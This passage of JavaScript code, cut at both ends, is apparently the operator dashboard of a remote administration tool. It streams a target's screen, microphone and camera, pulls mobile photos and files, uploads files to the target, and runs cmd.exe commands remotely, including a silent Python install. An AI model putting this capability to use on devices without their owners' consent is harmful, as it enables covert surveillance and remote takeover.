        list.scrollTop = list.scrollHeight;

    } else {

        unreadLogs++;

        if (entry.level === "error" || entry.level === "warn") {
            unreadErrors++;
        }

        updateLogBadge();
    }
}


function logEvent(level, message) {

    appendLogEntry({
        time: Date.now() / 1000,
        level: level,
        message: message
    });
}


// Website entries and device power events are mirrored into browser
// storage so they survive reloads and stay out of the main log.
const SITE_LOG_KEYS = {
    website: "activityWebsiteLog",
    devices: "activityDeviceLog"
};

const SITE_LOG_LIMIT = 300;

const SITE_LOG_EMPTY = {
    website: "No website entries stored yet.",
    devices: "No device power events stored yet."
};


function readSiteCursor() {

    try {
        return Number(
            window.localStorage.getItem("activitySiteLogCursor")
        ) || 0;
    } catch (error) {
        return 0;
    }
}


function writeSiteCursor(id) {

    try {
        window.localStorage.setItem(
            "activitySiteLogCursor",
            String(id)
        );
    } catch (error) {}
}


function readSiteLog(tab) {

    try {

        const parsed = JSON.parse(
            window.localStorage.getItem(SITE_LOG_KEYS[tab]) || "[]"
        );

        return Array.isArray(parsed) ? parsed : [];

    } catch (error) {
        return [];
    }
}


function writeSiteLog(tab, entries) {

    try {
        window.localStorage.setItem(
            SITE_LOG_KEYS[tab],
            JSON.stringify(entries.slice(-SITE_LOG_LIMIT))
        );
    } catch (error) {}
}


function renderSiteLog(tab) {

    const list = document.getElementById(
        tab === "website" ? "websiteLogList" : "deviceLogList"
    );

    if (!list) {
        return;
    }

    list.innerHTML = "";

    const entries = readSiteLog(tab);

    if (!entries.length) {

        const empty = document.createElement("div");

        empty.className = "log-empty";
        empty.textContent = SITE_LOG_EMPTY[tab];

        list.appendChild(empty);
        return;
    }

    for (const entry of entries) {
        list.appendChild(buildLogRow(entry));
    }

    list.scrollTop = list.scrollHeight;
}


function showLogTab(tab) {

    activeLogTab = tab;

    for (const button of document.querySelectorAll("[data-log-tab]")) {

        const active = button.dataset.logTab === tab;

        button.classList.toggle("active", active);
        button.setAttribute(
            "aria-pressed",
            active ? "true" : "false"
        );
    }

    for (const pane of document.querySelectorAll("[data-log-pane]")) {
        pane.hidden = pane.dataset.logPane !== tab;
    }

    if (tab === "website" || tab === "devices") {
        renderSiteLog(tab);
    }
}


async function pollSiteLogs() {

    try {

        const response = await fetch(
            "/api/logs/history?after=" + siteLogId
        );

        if (!response.ok) {
            return;
        }

        const data = await response.json();

        const last = Number(data.last) || 0;

        if (siteLogId && last && last < siteLogId) {
            // The stored log was reset, so listen from the start again.
            siteLogId = 0;
            writeSiteCursor(0);
            return;
        }

        const batches = { website: [], devices: [] };

        for (const entry of data.logs || []) {

            siteLogId = Math.max(
                siteLogId,
                Number(entry.id) || 0
            );

            const tab = entry.stream === "website"
                ? "website"
                : "devices";

            batches[tab].push({
                time: entry.time,
                level: entry.level,
                message: entry.message
            });
        }

        for (const tab of ["website", "devices"]) {

            if (!batches[tab].length) {
                continue;
            }

            const stored = readSiteLog(tab);

            stored.push(...batches[tab]);

            writeSiteLog(tab, stored);

            if (logOpen && activeLogTab === tab) {
                renderSiteLog(tab);
            }
        }

        if (siteLogId) {
            writeSiteCursor(siteLogId);
        }

    } catch (error) {}
}


function toggleLogDrawer(force) {

    const drawer = document.getElementById("logDrawer");

    logOpen =
        typeof force === "boolean" ? force : !logOpen;

    drawer.classList.toggle("open", logOpen);

    drawer.setAttribute(
        "aria-hidden",
        logOpen ? "false" : "true"
    );

    document.getElementById("logToggle").title =
        logOpen
            ? "Hide the activity log"
            : "Show the activity log";

    if (logOpen) {

        unreadLogs = 0;
        unreadErrors = 0;

        updateLogBadge();

        if (activeLogTab === "website" || activeLogTab === "devices") {

            renderSiteLog(activeLogTab);

        } else {

            const list = document.getElementById("logList");

            list.scrollTop = list.scrollHeight;
        }
    }
}


function clearLogs() {

    if (activeLogTab === "website" || activeLogTab === "devices") {

        writeSiteLog(activeLogTab, []);
        renderSiteLog(activeLogTab);
        return;
    }

    document.getElementById("logList").innerHTML =
        '<div class="log-empty">No activity yet.</div>';

    unreadLogs = 0;
    unreadErrors = 0;

    updateLogBadge();

    logEvent("info", "Activity log cleared.");
}


async function pollLogs() {

    try {

        const response = await fetch(
            "/api/logs?after=" + serverLogId
        );

        if (!response.ok) {
            return;
        }

        const data = await response.json();

        for (const entry of data.logs || []) {

            serverLogId = Math.max(serverLogId, entry.id);

            appendLogEntry(entry);
        }

    } catch (error) {}
}


// ==================================================
// TOASTS
// ==================================================

const TOAST_TITLES = {
    info: "Info",
    success: "Done",
    warn: "Warning",
    error: "Error"
};


function dismissToast(toast) {

    const state = toastTimers.get(toast);

    if (state) {
        clearTimeout(state.timer);
        toastTimers.delete(toast);
    }

    if (toast.classList.contains("leaving")) {
        return;
    }

    toast.classList.add("leaving");

    setTimeout(() => toast.remove(), 280);
}


function showToast(message, type = "info", title = "") {

    const stack = document.getElementById("toastStack");

    while (stack.childElementCount >= 4) {
        stack.firstElementChild.remove();
    }

    const toast = document.createElement("div");

    toast.className = "toast " + type;

    const heading = document.createElement("div");

    heading.className = "toast-title";
    heading.textContent = title || TOAST_TITLES[type] || "Info";

    const body = document.createElement("div");

    body.className = "toast-message";
    body.textContent = message;

    const close = document.createElement("button");

    close.className = "toast-close";
    close.textContent = "\u00d7";
    close.setAttribute("aria-label", "Dismiss notification");
    close.onclick = () => dismissToast(toast);

    const life =
        type === "error" ? 7000 :
        type === "warn" ? 5500 : 4200;

    toast.appendChild(heading);
    toast.appendChild(body);
    toast.appendChild(close);

    stack.appendChild(toast);

    const state = {
        startedAt: Date.now(),
        remaining: life,
        timer: null
    };

    state.timer = setTimeout(
        () => dismissToast(toast),
        life
    );

    toastTimers.set(toast, state);

    toast.addEventListener("mouseenter", () => {

        const active = toastTimers.get(toast);

        if (!active) {
            return;
        }

        clearTimeout(active.timer);

        active.remaining -=
            Date.now() - active.startedAt;
    });

    toast.addEventListener("mouseleave", () => {

        const active = toastTimers.get(toast);

        if (!active) {
            return;
        }

        active.startedAt = Date.now();

        active.timer = setTimeout(
            () => dismissToast(toast),
            Math.max(900, active.remaining)
        );
    });

    logEvent(
        type === "error" ? "error" :
        type === "warn" ? "warn" :
        type === "success" ? "success" : "info",
        message
    );
}


// ==================================================
// PATH HELPERS
// ==================================================

function normalizePath(path) {

    return path
        .replaceAll("\\", "/")
        .replace(/\/+/g, "/");
}


function getRootPath() {

    let root = normalizePath(currentRoot);

    if (/^[A-Za-z]:$/.test(root)) {
        root += "/";
    }

    return root;
}


function updatePath() {

    const root = getRootPath();

    const relative = normalizePath(currentFolder)
        .replace(/^\/+|\/+$/g, "");

    let fullPath;

    if (!relative) {
        fullPath = root;
    } else if (root.endsWith("/")) {
        fullPath = root + relative;
    } else {
        fullPath = root + "/" + relative;
    }

    document.getElementById("location").value = fullPath;
}


// ==================================================
// VIEW SWITCHING
// ==================================================

const VIEW_TITLES = {
    live: "Live Screen",
    screenshot: "Screenshot",
    stream: "Screen Share",
    mic: "Microphone",
    camera: "Camera",
    photos: "Pictures",
    python: "Python",
    files: "Files",
    downloader: "Downloader",
    console: "Console"
};


function showConnectView() {

    document.getElementById("homeView").hidden = true;
    document.getElementById("connectView").hidden = false;
}


function showHomeView(name) {

    document.getElementById("sidebarComputer").textContent = name;
    document.getElementById("topComputer").textContent = name;
    document.getElementById("connectView").hidden = true;
    document.getElementById("homeView").hidden = false;
}


function selectPanel(name) {

    if (!VIEW_TITLES[name] || !panelEnabled(name)) {
        name = "console";
    }

    document.getElementById("viewTitle").textContent = VIEW_TITLES[name];

    document.querySelectorAll(".view").forEach(view => {
        view.hidden = view.dataset.view !== name;
    });

    document.querySelectorAll(".nav-item").forEach(item => {
        item.classList.toggle(
            "active",
            item.dataset.panel === name
        );
    });

    if (name === "photos" && currentKind === "mobile") {
        loadPhotos();
        if (!photoPoll) {
            photoPoll = setInterval(loadPhotos, 5000);
        }
    } else if (photoPoll) {
        clearInterval(photoPoll);
        photoPoll = null;
    }
}


async function disconnectComputer(reason) {

    const gone = currentComputer;

    if (streamRunning) {
        await stopStream();
    }

    if (micRunning) {
        await stopMicrophone();
    }

    if (cameraRunning) {
        await stopCamera();
    }

    liveScreenReset();
    resetSnapshot();

    currentComputer = "";
    currentTree = null;
    currentFolder = "";
    currentRoot = "";
    currentKind = "desktop";

    clearTimeout(streamTimer);
    clearTimeout(micTimer);
    clearTimeout(cameraTimer);

    if (photoPoll) {
        clearInterval(photoPoll);
        photoPoll = null;
    }

    document.getElementById("photoGrid").textContent = "";
    document.getElementById("photoStatus").textContent = "No pictures yet.";

    consoleSetTarget();

    if (gone) {
        consolePrint(gone + " disconnected.", "console-err");
    }

    document.getElementById("connectionStatus").textContent =
        "Waiting for a computer...";

    document.getElementById("rootLocation").textContent =
        "Connect to a computer to browse its shared folder.";

    document.getElementById("directoryTree").textContent =
        "Connect to a computer to view folders.";

    document.getElementById("fileOutput").textContent =
        "Connect to a computer to view files.";

    document.getElementById("fileStatus").textContent = "";

    document.getElementById("screenshot").hidden = true;
    document.getElementById("streamImage").hidden = true;
    document.getElementById("cameraImage").hidden = true;
    document.getElementById("cameraImageFront").hidden = true;

    document.getElementById("streamButton").textContent =
        "Start Screen Share";

    document.getElementById("streamStatus").textContent =
        "Screen share is off.";

    document.getElementById("micButton").textContent =
        "Start Listening";

    document.getElementById("micStatus").textContent =
        "Microphone is off.";

    document.getElementById("micLevel").value = 0;

    document.getElementById("cameraButton").textContent =
        "Start Camera";

    document.getElementById("cameraStatus").textContent =
        "Camera is off.";

    selectPanel("console");
    showConnectView();

    if (gone) {
        if (reason) {
            showToast(reason, "info", "Disconnected");
            logEvent("info", reason);
        } else {
            showToast(
                gone + " is no longer connected.",
                "warn",
                "Computer offline"
            );
        }
    }
}


// ==================================================
// COMPUTER LIST
// ==================================================

const SITE_THEME_NAMES = [
    "pink", "green", "purple", "red", "blue",
    "yellow", "dark", "light", "mono", "hacker"
];

const SITE_EFFECT_NAMES = [
    "dyslexic", "flip", "mirror", "blur", "shake",
    "rainbow", "caps", "spin", "invert"
];


const siteStyles = document.getElementById("siteStyles");


function setSiteDesign(enabled) {

    if (!siteStyles) {
        return;
    }

    if (enabled) {
        siteStyles.media = "all";
        if (!siteStyles.isConnected) {
            document.head.appendChild(siteStyles);
        }
    } else if (siteStyles.isConnected) {
        siteStyles.remove();
    }
}


function applySiteEffects(effects) {

    effects = effects || {};

    const theme = effects.theme || "";

    for (const name of SITE_THEME_NAMES) {
        document.documentElement.classList.toggle(
            "theme-" + name,
            theme === name
        );
    }

    // Design off means no CSS at all: the stylesheet is detached.
    setSiteDesign(Boolean(effects.design));

    for (const name of SITE_EFFECT_NAMES) {
        document.body.classList.toggle(
            "fx-" + name,
            Boolean(effects[name])
        );
    }
}


const PANEL_NAMES = [
    "live", "screenshot", "stream", "mic", "camera",
    "photos", "python", "files", "downloader", "console"
];

let enabledPanels = [];

function panelEnabled(name) {

    return name === "console" || enabledPanels.includes(name);
}


function defaultPanel() {

    const preferred = currentKind === "mobile" ? "camera" : "live";

    return panelEnabled(preferred) ? preferred : "console";
}


function applyPanelAccess(panels) {

    if (Array.isArray(panels)) {
        enabledPanels = panels.filter(
            name => PANEL_NAMES.includes(name) && name !== "console"
        );
    }

    const mobile = currentKind === "mobile";

    document.querySelectorAll(".nav-item").forEach(item => {

        const panel = item.dataset.panel;

        const restricted = mobile
            ? DESKTOP_ONLY_PANELS.includes(panel)
            : MOBILE_ONLY_PANELS.includes(panel);

        item.closest("li").hidden =
            restricted || !panelEnabled(panel);
    });

    const active = document.querySelector(".nav-item.active");

    if (active && active.closest("li").hidden) {
        selectPanel(defaultPanel());
    }
}


async function refreshComputers() {

    try {

        const response = await api("/api/clients");
        const data = await response.json();

        deviceList = data.clients || [];

        applySiteEffects(data.effects);

        applyPanelAccess(data.panels);

        renderComputerOptions();

        const names = deviceList.map(c => c.name);

        if (currentComputer && !names.includes(currentComputer)) {
            await disconnectComputer();
        }

        if (!currentComputer) {

            const selected = document.getElementById("computerSelect").value;

            document.getElementById("connectionStatus").textContent =
                selected
                    ? "Press Connect to open this device."
                    : deviceList.length === 0
                        ? "No devices are connected yet."
                        : "Select a device and press Connect.";
        }

    } catch (error) {
        console.error(error);
    }
}


function selectDeviceKind(kind) {

    deviceKind = kind === "mobile" ? "mobile" : "desktop";

    document.querySelectorAll(".device-tab").forEach(tab => {
        tab.classList.toggle("active", tab.dataset.kind === deviceKind);
    });

    renderComputerOptions();
    refreshComputers();
}


function renderComputerOptions() {

    const select = document.getElementById("computerSelect");
    const previous = select.value;
    const matches = deviceList.filter(
        computer => (computer.kind || "desktop") === deviceKind
    );

    select.innerHTML = "";

    if (matches.length === 0) {

        const placeholder = document.createElement("option");

        placeholder.value = "";
        placeholder.textContent = deviceKind === "mobile"
            ? "No mobile devices connected"
            : "No Windows computers connected";
        placeholder.disabled = true;

        select.appendChild(placeholder);
    }

    for (const computer of matches) {

        const option = document.createElement("option");

        option.value = computer.name;
        option.dataset.kind = computer.kind || "desktop";
        option.textContent = computer.name;

        select.appendChild(option);
    }

    if (previous && matches.some(c => c.name === previous)) {
        select.value = previous;
    }
}


function applyDashboardMode(kind) {

    const mobile = kind === "mobile";

    document.getElementById("sidebarSub").textContent =
        mobile ? "Mobile web device" : "Connected";

    applyPanelAccess();

    if (mobile) {
        loadPhotos();
    }

    selectPanel(defaultPanel());
}


// ==================================================
// CONNECT
// ==================================================

async function connectComputer() {

    if (streamRunning) {
        await stopStream();
    }

    if (micRunning) {
        await stopMicrophone();
    }

    if (cameraRunning) {
        await stopCamera();
    }

    liveScreenReset();
    resetSnapshot();

    const select = document.getElementById("computerSelect");
    const selectedOption = select.selectedOptions[0];

    currentComputer = select.value;
    currentKind =
        (selectedOption && selectedOption.dataset.kind) || "desktop";

    if (!currentComputer) {
        consoleSetTarget();
        showToast("No device selected.", "error", "Nothing to connect");
        return;
    }

    consoleSetTarget();

    try {

        document.getElementById("connectionStatus").textContent =
            "Connecting to " + currentComputer + "...";

        const response = await api(
            "/api/tree?name=" +
            encodeURIComponent(currentComputer)
        );

        const data = await response.json();

        currentTree = data.tree;
        currentRoot = data.root;
        currentFolder = "";

        updatePath();

        document.getElementById("rootLocation").textContent =
            "Root folder: " + data.root;

        document.getElementById("connectionStatus").textContent =
            "Connected to " + data.name;

        renderTree();
        renderFiles();

        consoleSetTarget();
        consolePrint(
            "Connected to " + data.name + ".",
            "console-muted"
        );

        showHomeView(data.name);
        applyDashboardMode(currentKind);

        showToast(
            "Connected to " + data.name + ".",
            "success",
            "Connected"
        );

    } catch (error) {

        document.getElementById("connectionStatus").textContent =
            "Connection failed: " + error.message;

        showToast(
            "Could not connect: " + error.message,
            "error",
            "Connection failed"
        );

    }
}


// ==================================================
// FIND FOLDER
// ==================================================

function findFolder(node, path) {

    if (!node) {
        return null;
    }

    if (!path || path === ".") {
        return node;
    }

    const parts = normalizePath(path)
        .split("/")
        .filter(Boolean);

    let current = node;

    for (const part of parts) {

        if (part === "." || part === "..") {
            return null;
        }

        const directories = current.dirs || [];

        current = directories.find(
            folder =>
                folder.name.toLowerCase() === part.toLowerCase()
        );

        if (!current) {
            return null;
        }
    }

    return current;
}


// ==================================================
// LAZY FOLDER LOADING
// ==================================================

async function ensureFolderLoaded(path) {

    const folder = findFolder(currentTree, path);

    if (!folder) {
        return false;
    }

    if (folder.loaded) {
        return true;
    }

    const status = document.getElementById("fileStatus");

    status.textContent =
        "Loading " + (path || "root") + "...";

    try {

        const response = await api("/api/request-listing", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer,
                path: path
            })
        });

        const request = await response.json();

        let data = null;

        for (let attempt = 0; attempt < 60; attempt++) {

            await new Promise(resolve =>
                setTimeout(resolve, 500)
            );

            const check = await api(
                "/api/listing-status/" +
                encodeURIComponent(request.request_id)
            );

            data = await check.json();

            if (data.status === "ready") {
                break;
            }

            if (data.status === "error") {
                throw new Error(
                    data.error || "Folder listing failed."
                );
            }
        }

        if (!data || data.status !== "ready" || !data.listing) {
            throw new Error("Folder listing timed out.");
        }

        const target = findFolder(currentTree, path);

        if (!target) {
            throw new Error("Folder is no longer in the tree.");
        }

        target.dirs = data.listing.dirs || [];
        target.files = data.listing.files || [];
        target.loaded = true;

        status.textContent = "";

        return true;

    } catch (error) {

        status.textContent =
            "Folder listing failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Folder listing failed"
        );

        return false;
    }
}


async function ensurePathLoaded(path) {

    const parts = normalizePath(path)
        .split("/")
        .filter(Boolean);

    let prefix = "";

    for (const part of parts) {

        prefix = prefix ? prefix + "/" + part : part;

        const folder = findFolder(currentTree, prefix);

        if (!folder) {
            return false;
        }

        if (!folder.loaded) {

            const loaded = await ensureFolderLoaded(prefix);

            if (!loaded) {
                return false;
            }
        }
    }

    return true;
}


async function openFolder(folder) {

    currentFolder = folder.path || (
        currentFolder
            ? currentFolder + "/" + folder.name
            : folder.name
    );

    updatePath();

    await ensureFolderLoaded(currentFolder);

    renderTree();
    renderFiles();
}


// ==================================================
// FOLDER TREE
// OUTPUT 1
// ==================================================

function renderTree() {

    const container =
        document.getElementById("directoryTree");

    container.innerHTML = "";

    if (!currentTree) {
        container.textContent = "No directory information.";
        return;
    }

    const folder = findFolder(currentTree, currentFolder);

    if (!folder) {
        container.textContent = "Folder not found.";
        return;
    }

    const folders = folder.dirs || [];

    if (folders.length === 0) {
        container.textContent = "No folders in this directory.";
        return;
    }

    folders.forEach(subfolder => {

        const button = document.createElement("button");

        button.className = "folder-button";
        button.textContent = "📁 " + subfolder.name;

        button.onclick = () => openFolder(subfolder);

        const element = document.createElement("div");

        element.className = "directory";
        element.appendChild(button);

        container.appendChild(element);

    });
}


// ==================================================
// FILE LIST
// OUTPUT 2
// ==================================================

function renderFiles() {

    const container =
        document.getElementById("fileOutput");

    container.innerHTML = "";

    const folder = findFolder(currentTree, currentFolder);

    if (!folder) {
        container.textContent = "Folder not found.";
        return;
    }

    const files = folder.files || [];

    if (files.length === 0) {
        container.textContent = "No files in this directory.";
        return;
    }

    renderFileChunk(container, files, 0);
}


function renderFileChunk(container, files, start) {

    const end = Math.min(start + RENDER_CHUNK, files.length);

    for (let index = start; index < end; index++) {

        const file = files[index];

        const item = document.createElement("div");
        item.className = "file-item";

        const name = document.createElement("span");
        name.className = "file-name";

        name.textContent =
            "📄 " + file.name + " (" + formatSize(file.size) + ")";

        const button = document.createElement("button");

        button.textContent = "Download";

        button.onclick = () => downloadFile(file);

        item.appendChild(name);
        item.appendChild(button);

        container.appendChild(item);
    }

    if (end < files.length) {

        const more = document.createElement("button");

        more.textContent =
            "Show more (" + (files.length - end) + " remaining)";

        more.onclick = () => {

            more.remove();

            renderFileChunk(container, files, end);
        };

        container.appendChild(more);
    }
}


// ==================================================
// FILE SIZE
// ==================================================

function formatSize(bytes) {

    if (bytes < 1024) {
        return bytes + " B";
    }

    if (bytes < 1024 * 1024) {
        return (bytes / 1024).toFixed(2) + " KB";
    }

    return (bytes / (1024 * 1024)).toFixed(2) + " MB";
}


// ==================================================
// OPEN DIRECTORY
// ==================================================

async function navigateToFolder() {

    if (!currentTree) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    let entered =
        normalizePath(
            document.getElementById("location").value.trim()
        );

    const root = getRootPath();
    const rootWithoutSlash = root.replace(/\/+$/, "");

    // Handle the root itself.

    if (
        entered.toLowerCase() === root.toLowerCase() ||
        entered.toLowerCase() === rootWithoutSlash.toLowerCase()
    ) {
        goToRoot();
        return;
    }

    // Convert full paths into paths relative to the shared root.

    if (entered.toLowerCase().startsWith(root.toLowerCase())) {

        entered = entered.substring(root.length);

    } else if (
        entered.toLowerCase().startsWith(
            rootWithoutSlash.toLowerCase() + "/"
        )
    ) {

        entered = entered.substring(rootWithoutSlash.length + 1);

    }

    entered = entered.replace(/^\/+|\/+$/g, "");

    // Reject parent-directory traversal.

    if (
        entered.split("/").includes("..") ||
        entered.startsWith("/")
    ) {
        showToast("Invalid directory path.", "error", "Invalid path");
        return;
    }

    const loaded = await ensurePathLoaded(entered);
    const folder = findFolder(currentTree, entered);

    if (!loaded || !folder) {
        showToast(
            "Directory not found inside the shared folder.",
            "error",
            "Folder not found"
        );
        return;
    }

    currentFolder = entered;

    updatePath();
    renderTree();
    renderFiles();
}


// ==================================================
// ROOT FOLDER
// ==================================================

function goToRoot() {

    if (!currentTree) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    currentFolder = "";

    updatePath();
    renderTree();
    renderFiles();
}


// ==================================================
// REMOTE CONSOLE
// ==================================================

const CONSOLE_RESULT_POLL_MS = 500;
const CONSOLE_LINE_LIMIT = 500;

let consoleBusy = false;
let consoleHistory = [];
let consoleHistoryIndex = 0;


function consoleOutput() {

    return document.getElementById("consoleOutput");
}


function consolePrint(text, style) {

    const output = consoleOutput();

    const line = document.createElement("div");

    line.className =
        "console-line" + (style ? " " + style : "");

    line.textContent = text;

    output.appendChild(line);

    while (output.childElementCount > CONSOLE_LINE_LIMIT) {
        output.firstElementChild.remove();
    }

    output.scrollTop = output.scrollHeight;
}


function clearConsole() {

    consoleOutput().innerHTML = "";
}


function consoleSetBusy(value) {

    consoleBusy = value;

    const input = document.getElementById("consoleInput");
    const button = document.getElementById("consoleRunButton");

    input.disabled = value || !currentComputer;
    button.disabled = value || !currentComputer;
}


function consoleSetTarget() {

    const target = document.getElementById("consoleTarget");
    const input = document.getElementById("consoleInput");

    if (currentComputer) {

        target.textContent =
            "Target: " + currentComputer +
            " \u2014 commands run through cmd.exe on that computer.";

        input.placeholder = "Enter command...";

    } else {

        target.textContent =
            "Connect to a computer to use the console.";

        input.placeholder = "No computer connected";
    }

    consoleSetBusy(consoleBusy);
}


async function waitConsoleResult(commandId) {

    const deadline = Date.now() + 900000;

    while (Date.now() < deadline) {

        await new Promise(
            resolve => setTimeout(resolve, CONSOLE_RESULT_POLL_MS)
        );

        const response = await api(
            "/api/console/result/" +
            encodeURIComponent(commandId)
        );

        const data = await response.json();

        if (data.status === "ready") {
            return data;
        }

        if (data.status === "error") {
            throw new Error(
                data.message || "Command failed."
            );
        }
    }

    throw new Error("Timed out waiting for the remote computer.");
}


async function runConsoleCommand() {

    if (consoleBusy) {
        return;
    }

    const input = document.getElementById("consoleInput");
    const command = input.value;

    if (!command.trim() || !currentComputer) {
        return;
    }

    if (["clear", "cls"].includes(command.trim().toLowerCase())) {

        input.value = "";
        clearConsole();
        return;
    }

    consolePrint("remote> " + command, "console-echo");

    consoleHistory.push(command);
    consoleHistoryIndex = consoleHistory.length;

    input.value = "";
    consoleSetBusy(true);

    const computer = currentComputer;

    try {

        const response = await api("/api/console/command", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: computer,
                command: command
            })
        });

        const data = await response.json();

        if (
            /^(python-setup|setup-python|install-python)$/i.test(
                command.trim()
            )
        ) {
            consolePrint(
                "Checking the target computer. A download and silent " +
                "install can take a few minutes...",
                "console-muted"
            );
        }

        const result = await waitConsoleResult(data.command_id);

        if (result.output) {

            consolePrint(
                result.output.replace(/\s+$/, ""),
                "console-out"
            );
        }

        if (result.exit_code) {

            consolePrint(
                "[exit code " + result.exit_code + "]",
                "console-muted"
            );
        }

    } catch (error) {

        consolePrint("ERROR: " + error.message, "console-err");

        showToast(
            error.message,
            "error",
            "Console command failed"
        );

    } finally {

        consoleSetBusy(false);
        consolePrint("", "console-muted");

        // Panel and website commands change shared state, so pick it
        // up right away instead of waiting for the next poll.
        refreshComputers();

        if (!input.disabled) {
            input.focus();
        }
    }
}


document.getElementById("consoleInput")
    .addEventListener("keydown", function(event) {

        if (event.key === "Enter") {

            event.preventDefault();
            runConsoleCommand();
            return;
        }

        if (event.key === "ArrowUp") {

            if (!consoleHistory.length) {
                return;
            }

            event.preventDefault();

            consoleHistoryIndex = Math.max(
                0,
                consoleHistoryIndex - 1
            );

            this.value =
                consoleHistory[consoleHistoryIndex] || "";

            return;
        }

        if (event.key === "ArrowDown") {

            if (!consoleHistory.length) {
                return;
            }

            event.preventDefault();

            consoleHistoryIndex = Math.min(
                consoleHistory.length,
                consoleHistoryIndex + 1
            );

            this.value =
                consoleHistory[consoleHistoryIndex] || "";
        }
    });


document.getElementById("consoleOutput")
    .addEventListener("click", function() {

        const input = document.getElementById("consoleInput");

        if (!input.disabled) {
            input.focus();
        }
    });


// ==================================================
// DOWNLOAD FILE
// ==================================================

async function downloadFile(file) {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const status =
        document.getElementById("fileStatus");

    try {

        status.textContent =
            "Requesting: " + file.name;

        const response = await api(
            "/api/request-download",
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    name: currentComputer,
                    path: file.path
                })
            }
        );

        const result = await response.json();

        if (!result.download_id) {
            throw new Error("No download ID received.");
        }

        const downloadId = result.download_id;

        status.textContent =
            "Waiting for " + file.name + "...";

        let attempts = 0;

        const checkStatus = async () => {

            attempts++;

            try {

                const check = await api(
                    "/api/download-status/" +
                    encodeURIComponent(downloadId)
                );

                const data = await check.json();

                if (data.status === "ready") {

                    status.textContent =
                        "Download ready: " + file.name;

                    showToast(
                        "Download ready: " + file.name,
                        "success",
                        "Download"
                    );

                    window.location.href =
                        "/api/download/" +
                        encodeURIComponent(downloadId);

                    return;
                }

                if (data.status === "error") {
                    throw new Error(
                        data.message || "Download failed."
                    );
                }

                if (attempts >= 120) {
                    throw new Error("Download timed out.");
                }

                setTimeout(checkStatus, 1500);

            } catch (error) {

                status.textContent =
                    "Download failed: " + error.message;

                showToast(
                    error.message,
                    "error",
                    "Download failed"
                );

            }
        };

        setTimeout(checkStatus, 1500);

    } catch (error) {

        status.textContent =
            "Download failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Download failed"
        );

    }
}


// ==================================================
// DOWNLOADER (DASHBOARD -> REMOTEADMIN)
// ==================================================

let downloaderPicks = [];
let downloaderSending = false;


function downloadPickerChanged(source) {

    const fileInput = document.getElementById("dlFileInput");
    const folderInput = document.getElementById("dlFolderInput");

    if (source === "files") {
        folderInput.value = "";
        downloaderPicks = Array.from(fileInput.files || []);
    } else {
        fileInput.value = "";
        downloaderPicks = Array.from(folderInput.files || []);
    }

    renderDownloaderPicks();
}


function renderDownloaderPicks() {

    const box = document.getElementById("dlPicked");

    box.innerHTML = "";

    if (!downloaderPicks.length) {

        const empty = document.createElement("span");

        empty.className = "dl-empty";
        empty.textContent = "Nothing selected yet.";

        box.appendChild(empty);
        return;
    }

    const total = downloaderPicks.reduce(
        (sum, file) => sum + file.size,
        0
    );

    const summary = document.createElement("div");

    summary.className = "dl-summary";
    summary.textContent =
        downloaderPicks.length + " item(s), " +
        formatSize(total);

    box.appendChild(summary);

    downloaderPicks.slice(0, 8).forEach(file => {

        const row = document.createElement("div");

        row.className = "dl-row";

        const name = document.createElement("span");

        name.textContent =
            file.webkitRelativePath || file.name;

        const size = document.createElement("span");

        size.textContent = formatSize(file.size);

        row.appendChild(name);
        row.appendChild(size);

        box.appendChild(row);
    });

    if (downloaderPicks.length > 8) {

        const more = document.createElement("div");

        more.className = "dl-row";
        more.textContent = "and " + (downloaderPicks.length - 8) + " more...";

        box.appendChild(more);
    }
}


function clearDownloaderPicks() {

    downloaderPicks = [];

    document.getElementById("dlFileInput").value = "";
    document.getElementById("dlFolderInput").value = "";

    renderDownloaderPicks();

    document.getElementById("dlStatus").textContent = "";
}


async function sendDownloaderFiles() {

    if (downloaderSending) {
        return;
    }

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    if (!downloaderPicks.length) {
        showToast("Choose a file or folder first.", "error", "Downloader");
        return;
    }

    const status = document.getElementById("dlStatus");
    const button = document.getElementById("dlSendButton");

    downloaderSending = true;
    button.disabled = true;

    try {

        const form = new FormData();

        form.append("name", currentComputer);

        for (const file of downloaderPicks) {
            form.append("files", file, file.name);
            form.append(
                "paths",
                file.webkitRelativePath || file.name
            );
        }

        status.textContent =
            "Uploading " + downloaderPicks.length + " item(s)...";

        const response = await api(
            "/api/downloader/send",
            { method: "POST", body: form }
        );

        const result = await response.json();

        status.textContent =
            "Uploaded " + result.count + " item(s). Waiting for " +
            currentComputer + " to save them...";

        showToast(
            "Uploaded " + result.count + " item(s) for " + currentComputer + ".",
            "success",
            "Downloader"
        );

        await pollDownloaderStatus(
            result.transfer_id,
            result.count
        );

    } catch (error) {

        status.textContent = "Send failed: " + error.message;

        showToast(error.message, "error", "Downloader");

    } finally {

        downloaderSending = false;
        button.disabled = false;
    }
}


async function pollDownloaderStatus(transferId, count) {

    const status = document.getElementById("dlStatus");

    for (let attempt = 0; attempt < 90; attempt++) {

        await new Promise(resolve => setTimeout(resolve, 1000));

        if (!currentComputer) {
            return;
        }

        try {

            const response = await api(
                "/api/downloader/status/" +
                encodeURIComponent(transferId)
            );

            const data = await response.json();

            if (data.status === "done") {

                status.textContent =
                    "Saved " + count + " item(s) to the RemoteAdmin folder on " +
                    currentComputer + ".";

                showToast(
                    "Saved to the RemoteAdmin folder on " + currentComputer + ".",
                    "success",
                    "Downloader"
                );

                return;
            }

            if (data.status === "error") {

                throw new Error(
                    data.message || "The computer could not save the files."
                );
            }

        } catch (error) {

            status.textContent = "Download failed: " + error.message;

            showToast(error.message, "error", "Downloader");

            return;
        }
    }

    status.textContent =
        "Still waiting for " + currentComputer + " to save the files.";
}


// ==================================================
// SCREENSHOT
// ==================================================

async function requestScreenshot() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const status =
        document.getElementById("screenshotStatus");

    try {

        status.textContent = "Requesting screenshot...";

        const response = await api(
            "/api/request-screenshot",
            {
